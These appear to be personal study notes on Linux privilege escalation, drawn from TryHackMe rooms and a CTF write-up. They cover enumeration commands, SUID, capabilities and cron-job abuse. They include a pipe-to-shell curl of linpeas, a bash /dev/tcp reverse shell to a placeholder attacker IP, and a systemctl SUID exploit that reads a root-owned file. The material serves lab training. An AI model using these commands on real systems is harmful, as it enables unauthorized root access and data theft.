[From: TryHackMe - Linux Privilege Escalation ; https://tryhackme.com/room/linprivesc ; Task 3 - Enumeration (with editing, changes, and additions)]

Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.

------------------------------
Helpful CLI Commands used to enumerate a Linux device in order to gain the information needed for privilege escalation
----------------------------------------------------------------------------------------------------------------------
hostname
The 'hostname' command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

uname -a
Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

ps Command
The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.
The output of the ps (Process Status) will show the following;
* PID: The process ID (unique to the process)
* TTY: Terminal type used by the user
* Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
* CMD: The command or executable running (will NOT display any command line parameter)
The “ps” command provides a few useful options.
* ps -A: View all running processes
* ps -axjf: View process tree
* ps -aux: The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

env
The 'env' command will show environmental variables.
The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

sudo -l
The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.

ls
One of the most common commands used in Linux is probably 'ls'.
While looking for potential privilege escalation vectors, please remember to always use the ls command with the -la parameter (so hidden files will also be shown). 

id
The 'id' command will provide a general overview of the user’s privilege level and group memberships.
It is worth remembering that the id command can also be used to obtain the same information for another user (syntax: id <USERNAME>).

history
Looking at earlier commands with the 'history' command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

ifconfig and ip route
The target system may be a pivoting point to another network. The 'ifconfig' command will give us information about the network interfaces of the system. However, some of the interfaces listed may not be directly accessible by the system you are presently on.
Use the 'ip route' command to see which network routes exist for the system you are on.

netstat
Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The 'netstat' command can be used with several different options to gather information on existing connections.
* netstat -a: shows all listening ports and established connections.
* netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
* netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
* netstat -s: list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol.
* netstat -tp: list connections with the service name and PID information. This can also be used with the -l option (netstat -ltp) to list listening ports.
However, if you are not running this command as aroot user the “PID/Program name” column will show "-" for any process owned by another user. If possible, run this command as root to see the names of all processes.
* netstat -i: Shows interface statistics (i.e. how active each interface is).
* netstat -ano: The netstat usage you will probably see most often in blog posts, write-ups, and courses is 'netstat -ano' which can be broken down as follows:
-a: Display all sockets
-n: Do not resolve names
-o: Display timer

find Command
Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.
Below are some useful examples for the “find” command.
Find files:
find . -name flag1.txt: find the file named “flag1.txt” in the current directory
find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
find / -type d -name config: find the directory named config under “/”
find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
find / -perm a=x: find executable files
find /home -user frank: find all files for user “frank” under “/home”
find / -mtime 10: find files that were modified in the last 10 days
find / -atime 10: find files that were accessed in the last 10 day
find / -cmin -60: find files changed within the last hour (60 minutes)
find / -amin -60: find files accesses within the last hour (60 minutes)
find / -size 50M: find files with a 50 MB size. This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size (e.g. find / -size +100M or find / -size -10M)

It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output.

Here is how to find files that are able to be written to or executed from:
* find / -writable -type d 2>/dev/null : Find world-writeable folders
* find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
* find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
(The reason we see three different “find” commands that could potentially lead to the same result can be seen in the 'find' manual document. Basically, the '-perm' parameter affects the way “find” works.)
* find / -perm -o x -type d 2>/dev/null : Find world-executable folders

Find development tools and supported languages:
* find / -name perl*
* find / -name python*
* find / -name gcc*

Find specific file permissions:
Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path (see below).
* find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

General Linux Commands
As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Get comfortable with commands such as find, locate, grep, cut, sort, etc.

-----------------------------------------------------------------------
Files to search for information that may assist in privilege escalation
-----------------------------------------------------------------------
/proc/version
The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.
Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

/etc/issue
Systems can also be identified by looking at the /etc/issue file. This file usually contains some information about the operating system but can easily be customized or changes. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

/etc/passwd
Reading the /etc/passwd file can be an easy way to discover users on the system.
While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks, using the following syntax:
cat /etc/passwd | cut -d ":" -f 1
Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory; syntax: cat /etc/passwd | grep home.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
[From: TryHackMe - Linux Privilege Escalation ; https://tryhackme.com/room/linprivesc ; Task 4 - Automated Enumeration Tools (with some editing)]

Several tools can help you save time during the enumeration process. These tools should only be used to save time, knowing that they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few tools rather than having a single "go-to" tool.

LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
[also see: https://www.aldeid.com/wiki/LinPEAS ; you can run up-to-date version directly from GitHub using:
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh]
LinEnum: https://github.com/rebootuser/LinEnum
LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
Linux Priv Checker: https://github.com/linted/linuxprivchecker
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
[From: TryHackMe - Linux Privilege Escalation ; https://tryhackme.com/room/linprivesc ; Task 5 - Privilege Escalation: Kernel Exploits (with some editing, etc.)]

Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.

Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.

The Kernel exploit methodology is simple:
1) Identify the kernel version
2) Search and find an exploit code for the kernel version of the target system
3) Run the exploit

WARNING: Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

Research sources:
* Based on your findings, you can use Google to search for an existing exploit code.
* Sources such as https://www.linuxkernelcves.com/cves can also be useful.
* Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

Hints/Notes:
* Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit [can mean missing potential exploits].
* WARNING: Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
* Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
* You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively.
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
[From: https://tryhackme.com/room/linprivesc ; Task 7 - Privilege Escalation: SUID (with editing, etc.)]

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

You will notice these files have an “s” bit set showing their special permission level (e.g. -rwsr-xr-x).


find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SGID bits set.

A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list https://gtfobins.github.io/#+suid).

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
[From: https://tryhackme.com/room/linprivesc ; Task 8 - Privilege Escalation: Capabilities (with editing, etc.)]
Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities 'man' page provides detailed information on its usage and options.

We can use the 'getcap' tool to list enabled capabilities.
example syntax: getcap -r / 2>/dev/null
[Note: When run as an unprivileged user, 'getcap -r /' will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.]
...GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
[From: https://tryhackme.com/room/linprivesc ; Task 9 - Privilege Escalation: Cron Jobs (with editing, etc.)]
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Cron job configurations are stored as crontabs (cron tables); [these tables show] the next time and date the task will run.

Each user on the system [will] have their [own] crontab file [which will] run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under /etc/crontab

While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.

[If] our current user can access [a] script set to run [as a cron job], we can easily modify it to create a reverse shell, hopefully with root privileges.

The script will use the tools available on the target system to launch a reverse shell.
Two points to note:
1) The command syntax will vary depending on the available tools. (e.g. nc will probably not support the -e option you may have seen used in other cases)
2) We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.
-----------
An example reverse shell script:
#!/bin/bash
bash -i >& /dev/tcp/<IP_ADDRESS_OF_ATTACK MACHINE>/<ATTACK_MACHINE'S_LISTENING_PORT> 0>&1

On the attack machine we will open up a listening port to await the reverse shell:
nc -nlvp <LISTENING_PORT>
------------
Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:

* System administrators need to run a script at regular intervals.
* They create a cron job to do this
* After a while, the script becomes useless, and they delete it
* They do not clean the relevant cron job
* This change management issue leads to a potential exploit leveraging cron jobs.

If a script was deleted, but the cron job still exists and if the full path of the script is not defined ... cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script with the same name as the deleted script under our user’s home folder and it should be run by the cron job.

In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
[From: https://tryhackme.com/room/vulnversity ; Task 5 - Privilege Escalation]
"In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes."
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
Another recommended TryHackMe room on this topic is: https://tryhackme.com/room/kenobi ; Task 4 - Privilege Escalation with Path Variable Manipulation.
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
From: https://unicornsec.com/home/tryhackme-vulnversity
"Privilege Escalation
[After] we have a remote shell on our target the next step is to try to escalate our privileges to root. A common technique for privesc when doing CTFs or online challenges like this is to look for files that have the SUID bit set. 

So how do we find SUID files on our target?

find / -perm /4000 2>&1 | grep -v “Permission denied”

find /: calls the built-in find utility and starts looking at the root “/” directory

-perm: Any  of the permission bits are set for the file

/4000: the numerical value for files that have the SUID bit

2>&1 |: This instruction allows you to tell the shell to make one stream got to the same destination as another stream. In this case, we’re saying “redirect stream 2, stderr, to the same destination that stream 1, stdout, is being redirected to. We then pipe that output into the next command.

grep -v “Permission denied”: use grep to filter the output with the “-v” flag which Inverts the sense of matching to select non-matching lines. Basically “show me everything BUT lines that contain Permission denied”...

Systemctl is the tool used to control the systemd init service. 

In ye olde tymes Linux used SysV as it’s init system to prepare user space after boot and ready the system for operation. Within the last decade a new init system was developed called systemd and basically took over every major Linux distribtution.

If we combine what we now know about SUID and systemd we can appreciate the red flag that goes up when we see those two things together. 

Our target system allows any logged in user to create a system service and run it as root! ...

[In the below example systemctl is exploited to pipe data from a file in the root directory to a file accessible to a standard user (a type of privilege escalation).

The commands to escalate privileges using systemctl is as follows:
$ eop=$(mktemp).service
$ echo ‘[Service]
> ExecStart=/bin/sh -c “cat /root/root.txt > /tmp/output”
> [Install]
> WantedBy=multi-user.target’ > $eop
$ /bin/systemctl link $eop
$ /bin/systemctl enable --now $eop
Here is the explanation of each command:]

eop=$(mktemp).service - we are creating an environment variable called “eop” (you can call it whatever you want). Within that variable we are calling the mktemp command to create a temporary file as a systemd service unit file (the “.service” part at the end)
...The problem [was] that our current logged-in user does not have permission to write to /etc/systemd/system where this would normally go. We get around that by echoing our unit file one line at a time into the env variable we just created.

echo ‘[Service] - calls the echo command to start echoing the input (notice the single quote? By not including the second single quote to close the line we are able to enter multiple single line inputs and complete our systemd unit file)

ExecStart=/bin/sh -c “cat /root/root.txt > /tmp/output” - when the service starts call the default system shell (the -c tells the shell to execute everything inside the quotes), use cat to display the contents of the root.txt file and output that to a file called output in the /tmp directory

[Install] - the second part of our unit file

WantedBy=multi-user.target’ > $eop - sets the state (or runlevel) at which this service will run (notice the closing single quote?), the > directs all our inputs to the eop env variable

/bin/systemctl link $eop - per the systemctl man page, this makes our unit file available for systemctl commands even though it is outside of the standard search paths

/bin/systemctl enable --now $eop - also per the systemctl man page “…Enable one or more units or unit instances. This will create a set of symlinks, as encoded in the "[Install]" sections of the indicated unit files. After the symlinks have been created, the system manager configuration is reloaded (in a way equivalent to daemon-reload), in order to ensure the changes are taken into account immediately. Note that this does not have the effect of also starting any of the units being enabled. If this is desired, combine this command with the --now switch…”

From here we check the output file we created and are greeted with the [data from the targeted file residing in the root directory]."
From: https://unicornsec.com/home/tryhackme-vulnversity
--------------------------------------------------------------------------------------------------------------------------------------------------------
Linux Privilege Escalation Cheat Sheet:
https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Cheat%20sheets%20reference%20pages%20Checklists%20-/Linux/cheat%20sheet%20Basic%20Linux%20Privilege%20Escalation.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------
GTFOBins
https://gtfobins.github.io/
"GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

The project collects legitimate functions of Unix binaries that can be abused to ... break out [of] restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

It is important to note that this is not a list of exploits, and the programs listed here are not vulnerable per se, rather, GTFOBins is a compendium about how to live off the land when you only have certain binaries available."
--------------------------------------------------------------------------------------------------------------------------------------------------------
Post-access Discovery/Enumeration Commands
-------------------------------------------
[From: NetworkChuck - HELP!! (for when you suck at Linux) // Linux for Hackers // EP3 ; https://www.youtube.com/watch?v=Y17KTiJLcyQ&list=PLIhvC56v63IJIujb5cyE13oLuyORZpdkL&index=6]

* id
* hostname
* uname 
* uname -a
* uname -r
* ifconfig
* ip
* netstat
* ss
* ps
* whoami
* who [tells who else is logged into system]
* env [environment variables]
* lsblk
* lsusb [lists any USBs plugged in to system]
* lsof [lists all open files]
